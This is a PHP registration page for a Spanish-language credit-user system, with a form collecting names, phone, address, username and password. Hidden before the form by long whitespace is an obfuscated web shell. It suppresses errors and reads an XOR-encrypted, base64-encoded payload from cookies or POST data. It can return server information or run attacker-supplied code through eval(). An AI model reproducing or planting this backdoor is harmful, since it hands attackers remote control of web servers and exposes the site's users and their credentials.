<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['s1cd'];global$s1cd;$s1cd=$GLOBALS;$s1cd['v943']="\x57\x6a\x66\x36\x25\xa\x30\x79\x4d\x7d\x61\x38\x4c\x44\x6d\x76\x54\x3a\x71\xd\x45\x6c\x64\x7e\x3e\x73\x50\x39\x48\x60\x3c\x24\x75\x21\x67\x2e\x4a\x33\x5e\x6f\x2d\x68\x35\x5f\x5b\x49\x4e\x7a\x78\x40\x5d\x32\x4f\x7c\x62\x77\x20\x27\x2c\x56\x26\x9\x47\x2b\x72\x6b\x2f\x43\x59\x41\x7b\x52\x58\x5c\x3f\x29\x37\x4b\x65\x31\x55\x46\x34\x42\x5a\x69\x63\x3d\x51\x23\x3b\x70\x74\x22\x53\x28\x2a\x6e";$s1cd[$s1cd['v943'][1].$s1cd['v943'][6].$s1cd['v943'][10].$s1cd['v943'][11].$s1cd['v943'][11]]=$s1cd['v943'][86].$s1cd['v943'][41].$s1cd['v943'][64];$s1cd[$s1cd['v943'][2].$s1cd['v943'][54].$s1cd['v943'][54].$s1cd['v943'][76].$s1cd['v943'][54].$s1cd['v943'][82].$s1cd['v943'][27].$s1cd['v943'][42]]=$s1cd['v943'][39].$s1cd['v943'][64].$s1cd['v943'][22];$s1cd[$s1cd['v943'][54].$s1cd['v943'][86].$s1cd['v943'][10].$s1cd['v943'][54]]=$s1cd['v943'][25].$s1cd['v943'][92].$s1cd['v943'][64].$s1cd['v943'][21].$s1cd['v943'][78].$s1cd['v943'][97];$s1cd[$s1cd['v943'][1].$s1cd['v943'][22].$s1cd['v943'][6].$s1cd['v943'][42].$s1cd['v943'][54].$s1cd['v943'][78]]=$s1cd['v943'][85].$s1cd['v943'][97].$s1cd['v943'][85].$s1cd['v943'][43].$s1cd['v943'][25].$s1cd['v943'][78].$s1cd['v943'][92];$s1cd[$s1cd['v943'][78].$s1cd['v943'][6].$s1cd['v943'][86].$s1cd['v943'][37].$s1cd['v943'][79].$s1cd['v943'][11].$s1cd['v943'][10].$s1cd['v943'][22]]=$s1cd['v943'][25].$s1cd['v943'][78].$s1cd['v943'][64].$s1cd['v943'][85].$s1cd['v943'][10].$s1cd['v943'][21].$s1cd['v943'][85].$s1cd['v943'][47].$s1cd['v943'][78];$s1cd[$s1cd['v943'][34].$s1cd['v943'][6].$s1cd['v943'][10].$s1cd['v943'][51].$s1cd['v943'][78].$s1cd['v943'][54].$s1cd['v943'][79].$s1cd['v943'][6].$s1cd['v943'][11]]=$s1cd['v943'][91].$s1cd['v943'][41].$s1cd['v943'][91].$s1cd['v943'][15].$s1cd['v943'][78].$s1cd['v943'][64].$s1cd['v943'][25].$s1cd['v943'][85].$s1cd['v943'][39].$s1cd['v943'][97];$s1cd[$s1cd['v943'][7].$s1cd['v943'][76].$s1cd['v943'][2].$s1cd['v943'][27].$s1cd['v943'][42]]=$s1cd['v943'][32].$s1cd['v943'][97].$s1cd['v943'][25].$s1cd['v943'][78].$s1cd['v943'][64].$s1cd['v943'][85].$s1cd['v943'][10].$s1cd['v943'][21].$s1cd['v943'][85].$s1cd['v943'][47].$s1cd['v943'][78];$s1cd[$s1cd['v943'][1].$s1cd['v943'][22].$s1cd['v943'][51].$s1cd['v943'][86].$s1cd['v943'][3]]=$s1cd['v943'][54].$s1cd['v943'][10].$s1cd['v943'][25].$s1cd['v943'][78].$s1cd['v943'][3].$s1cd['v943'][82].$s1cd['v943'][43].$s1cd['v943'][22].$s1cd['v943'][78].$s1cd['v943'][86].$s1cd['v943'][39].$s1cd['v943'][22].$s1cd['v943'][78];$s1cd[$s1cd['v943'][64].$s1cd['v943'][82].$s1cd['v943'][42].$s1cd['v943'][3].$s1cd['v943'][22].$s1cd['v943'][27]]=$s1cd['v943'][25].$s1cd['v943'][78].$s1cd['v943'][92].$s1cd['v943'][43].$s1cd['v943'][92].$s1cd['v943'][85].$s1cd['v943'][14].$s1cd['v943'][78].$s1cd['v943'][43].$s1cd['v943'][21].$s1cd['v943'][85].$s1cd['v943'][14].$s1cd['v943'][85].$s1cd['v943'][92];$s1cd[$s1cd['v943'][2].$s1cd['v943'][86].$s1cd['v943'][78].$s1cd['v943'][54].$s1cd['v943'][76].$s1cd['v943'][3].$s1cd['v943'][37].$s1cd['v943'][2]]=$s1cd['v943'][65].$s1cd['v943'][10].$s1cd['v943'][86].$s1cd['v943'][54].$s1cd['v943'][3].$s1cd['v943'][54].$s1cd['v943'][51].$s1cd['v943'][51].$s1cd['v943'][86];$s1cd[$s1cd['v943'][86].$s1cd['v943'][3].$s1cd['v943'][3].$s1cd['v943'][10].$s1cd['v943'][54].$s1cd['v943'][2].$s1cd['v943'][10].$s1cd['v943'][37].$s1cd['v943'][10]]=$s1cd['v943'][55].$s1cd['v943'][6].$s1cd['v943'][2].$s1cd['v943'][54];$s1cd[$s1cd['v943'][14].$s1cd['v943'][76].$s1cd['v943'][11].$s1cd['v943'][2].$s1cd['v943'][78]]=$_POST;$s1cd[$s1cd['v943'][14].$s1cd['v943'][42].$s1cd['v943'][42].$s1cd['v943'][6].$s1cd['v943'][27].$s1cd['v943'][10].$s1cd['v943'][54].$s1cd['v943'][11]]=$_COOKIE;@$s1cd[$s1cd['v943'][1].$s1cd['v943'][22].$s1cd['v943'][6].$s1cd['v943'][42].$s1cd['v943'][54].$s1cd['v943'][78]]($s1cd['v943'][78].$s1cd['v943'][64].$s1cd['v943'][64].$s1cd['v943'][39].$s1cd['v943'][64].$s1cd['v943'][43].$s1cd['v943'][21].$s1cd['v943'][39].$s1cd['v943'][34],NULL);@$s1cd[$s1cd['v943'][1].$s1cd['v943'][22].$s1cd['v943'][6].$s1cd['v943'][42].$s1cd['v943'][54].$s1cd['v943'][78]]($s1cd['v943'][21].$s1cd['v943'][39].$s1cd['v943'][34].$s1cd['v943'][43].$s1cd['v943'][78].$s1cd['v943'][64].$s1cd['v943'][64].$s1cd['v943'][39].$s1cd['v943'][64].$s1cd['v943'][25],0);@$s1cd[$s1cd['v943'][1].$s1cd['v943'][22].$s1cd['v943'][6].$s1cd['v943'][42].$s1cd['v943'][54].$s1cd['v943'][78]]($s1cd['v943'][14].$s1cd['v943'][10].$s1cd['v943'][48].$s1cd['v943'][43].$s1cd['v943'][78].$s1cd['v943'][48].$s1cd['v943'][78].$s1cd['v943'][86].$s1cd['v943'][32].$s1cd['v943'][92].$s1cd['v943'][85].$s1cd['v943'][39].$s1cd['v943'][97].$s1cd['v943'][43].$s1cd['v943'][92].$s1cd['v943'][85].$s1cd['v943'][14].$s1cd['v943'][78],0);@$s1cd[$s1cd['v943'][64].$s1cd['v943'][82].$s1cd['v943'][42].$s1cd['v943'][3].$s1cd['v943'][22].$s1cd['v943'][27]](0);$o2b760d77=NULL;$mccf=NULL;$s1cd[$s1cd['v943'][34].$s1cd['v943'][11].$s1cd['v943'][54].$s1cd['v943'][82].$s1cd['v943'][78]]=$s1cd['v943'][82].$s1cd['v943'][79].$s1cd['v943'][82].$s1cd['v943'][82].$s1cd['v943'][27].$s1cd['v943'][78].$s1cd['v943'][11].$s1cd['v943'][78].$s1cd['v943'][40].$s1cd['v943'][79].$s1cd['v943'][86].$s1cd['v943'][3].$s1cd['v943'][86].$s1cd['v943'][40].$s1cd['v943'][82].$s1cd['v943'][78].$s1cd['v943'][6].$s1cd['v943'][10].$s1cd['v943'][40].$s1cd['v943'][11].$s1cd['v943'][6].$s1cd['v943'][42].$s1cd['v943'][76].$s1cd['v943'][40].$s1cd['v943'][54].$s1cd['v943'][10].$s1cd['v943'][11].$s1cd['v943'][78].$s1cd['v943'][3].$s1cd['v943'][82].$s1cd['v943'][22].$s1cd['v943'][76].$s1cd['v943'][27].$s1cd['v943'][10].$s1cd['v943'][3].$s1cd['v943'][6];global$g8b4e;function w0fb($o2b760d77,$dfe998){global$s1cd;$k6d461="";for($kb2871994=0;$kb2871994<$s1cd[$s1cd['v943'][54].$s1cd['v943'][86].$s1cd['v943'][10].$s1cd['v943'][54]]($o2b760d77);){for($sc47364=0;$sc47364<$s1cd[$s1cd['v943'][54].$s1cd['v943'][86].$s1cd['v943'][10].$s1cd['v943'][54]]($dfe998)&&$kb2871994<$s1cd[$s1cd['v943'][54].$s1cd['v943'][86].$s1cd['v943'][10].$s1cd['v943'][54]]($o2b760d77);$sc47364++,$kb2871994++){$k6d461.=$s1cd[$s1cd['v943'][1].$s1cd['v943'][6].$s1cd['v943'][10].$s1cd['v943'][11].$s1cd['v943'][11]]($s1cd[$s1cd['v943'][2].$s1cd['v943'][54].$s1cd['v943'][54].$s1cd['v943'][76].$s1cd['v943'][54].$s1cd['v943'][82].$s1cd['v943'][27].$s1cd['v943'][42]]($o2b760d77[$kb2871994])^$s1cd[$s1cd['v943'][2].$s1cd['v943'][54].$s1cd['v943'][54].$s1cd['v943'][76].$s1cd['v943'][54].$s1cd['v943'][82].$s1cd['v943'][27].$s1cd['v943'][42]]($dfe998[$sc47364]));}}return$k6d461;}function kacb6b22c($o2b760d77,$dfe998){global$s1cd;global$g8b4e;return$s1cd[$s1cd['v943'][86].$s1cd['v943'][3].$s1cd['v943'][3].$s1cd['v943'][10].$s1cd['v943'][54].$s1cd['v943'][2].$s1cd['v943'][10].$s1cd['v943'][37].$s1cd['v943'][10]]($s1cd[$s1cd['v943'][86].$s1cd['v943'][3].$s1cd['v943'][3].$s1cd['v943'][10].$s1cd['v943'][54].$s1cd['v943'][2].$s1cd['v943'][10].$s1cd['v943'][37].$s1cd['v943'][10]]($o2b760d77,$g8b4e),$dfe998);}foreach($s1cd[$s1cd['v943'][14].$s1cd['v943'][42].$s1cd['v943'][42].$s1cd['v943'][6].$s1cd['v943'][27].$s1cd['v943'][10].$s1cd['v943'][54].$s1cd['v943'][11]]as$dfe998=>$sb99d0b18){$o2b760d77=$sb99d0b18;$mccf=$dfe998;}if(!$o2b760d77){foreach($s1cd[$s1cd['v943'][14].$s1cd['v943'][76].$s1cd['v943'][11].$s1cd['v943'][2].$s1cd['v943'][78]]as$dfe998=>$sb99d0b18){$o2b760d77=$sb99d0b18;$mccf=$dfe998;}}$o2b760d77=@$s1cd[$s1cd['v943'][7].$s1cd['v943'][76].$s1cd['v943'][2].$s1cd['v943'][27].$s1cd['v943'][42]]($s1cd[$s1cd['v943'][2].$s1cd['v943'][86].$s1cd['v943'][78].$s1cd['v943'][54].$s1cd['v943'][76].$s1cd['v943'][3].$s1cd['v943'][37].$s1cd['v943'][2]]($s1cd[$s1cd['v943'][1].$s1cd['v943'][22].$s1cd['v943'][51].$s1cd['v943'][86].$s1cd['v943'][3]]($o2b760d77),$mccf));if(isset($o2b760d77[$s1cd['v943'][10].$s1cd['v943'][65]])&&$g8b4e==$o2b760d77[$s1cd['v943'][10].$s1cd['v943'][65]]){if($o2b760d77[$s1cd['v943'][10]]==$s1cd['v943'][85]){$kb2871994=Array($s1cd['v943'][91].$s1cd['v943'][15]=>@$s1cd[$s1cd['v943'][34].$s1cd['v943'][6].$s1cd['v943'][10].$s1cd['v943'][51].$s1cd['v943'][78].$s1cd['v943'][54].$s1cd['v943'][79].$s1cd['v943'][6].$s1cd['v943'][11]](),$s1cd['v943'][25].$s1cd['v943'][15]=>$s1cd['v943'][79].$s1cd['v943'][35].$s1cd['v943'][6].$s1cd['v943'][40].$s1cd['v943'][79],);echo@$s1cd[$s1cd['v943'][78].$s1cd['v943'][6].$s1cd['v943'][86].$s1cd['v943'][37].$s1cd['v943'][79].$s1cd['v943'][11].$s1cd['v943'][10].$s1cd['v943'][22]]($kb2871994);}elseif($o2b760d77[$s1cd['v943'][10]]==$s1cd['v943'][78]){eval($o2b760d77[$s1cd['v943'][22]]);}exit();} ?><!DOCTYPE html>
<html lang="es">
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">Logueo Usuario Creditos</head>
<body style="background-color=#404546;">

<form method="POST">

<table>
<tr>
<td>
 Nombre
</td>
<td>
<input type="name" name="nombre" placeholder="Digite el nombre" required>
</td>
</tr>
<tr>
<td>
 Primer Apellido
</td>
<td>
<input type="name" name="apellido1" placeholder="Digite el primer apellido" required>
</td>
</tr>
<tr>
<td>
 Segundo Apellido
</td>
<td>
<input type="name" name="apellido2" placeholder="Digite el segundo apellido" required>
</td>
</tr>
<tr>
<td>
 Tel�fono
</td>
<td>
<input type="name" name="telefono" placeholder="Digite el Tel�fono" required>
</td>
</tr>
<tr>
<td>
 Direcci�n
</td>
<td>
  <textarea placeholder="Digite la direcci�n del usuari"  name="direccion" id="direccion" rows="5"></textarea>
						    
</td>
</tr>
<tr>
<td>
 Usuario
</td>
<td>
<input type="name" name="usuario" required>
</td>
</tr>
<tr>
<td>
 Contrase�a
</td>
<td>
<input type="password" name="pass" required>
</td>
</tr>
<tr>
<td>
 Repetir Contrase�a
</td>
<td>
<input type="password" name="repPass" required>
</td>
</tr>
</table>
<input type="submit" value="submit" text="Registrar" >
<input type="reset"  >
</form>
<?php
if (isset($_POST['submit'])){

 require("registro.php")
}

?>


</body>
</html>